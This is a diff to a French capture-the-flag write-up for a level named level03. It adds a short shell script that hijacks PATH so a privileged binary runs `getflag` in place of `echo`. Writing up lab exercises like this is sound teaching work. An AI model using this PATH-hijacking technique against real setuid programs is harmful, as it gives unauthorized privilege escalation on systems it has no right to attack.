@@ -11,3 +11,9 @@ On va donc faire une manip pour remplacer `echo` par `getflag`
 2. on le renome en `echo`
 3. on remplace la variable d'env `PATH` en `PATH=/tmp` pour qu'il tape sur notre faux echo
 4. on relance le binaire `level03`
+
+On peut également executer le script suivant sur la vm
+cp /bin/getflag /tmp
+mv /tmp/getflag /tmp/echo
+export PATH=/tmp
+/home/user/level03/level03
